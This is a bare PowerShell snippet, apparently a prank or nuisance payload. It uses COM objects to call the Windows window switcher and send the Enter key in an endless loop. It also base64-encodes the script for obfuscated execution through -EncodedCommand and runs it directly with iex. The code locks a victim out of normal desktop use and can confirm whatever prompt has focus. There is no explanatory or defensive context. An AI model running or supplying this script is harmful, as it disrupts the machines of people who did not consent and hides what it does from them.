$st='$a=[activator]::CreateInstance([type]::gettypefromclsid("9ba05972-f6a8-11cf-a442-00a0c90a8f39")).item().document.application;$w=New-Object -ComObject wscript.shell;while(1){$a.WindowSwitcher();$w.SendKeys("~")}'
[convert]::ToBase64String([text.encoding]::Unicode.GetBytes($st))

iex $st

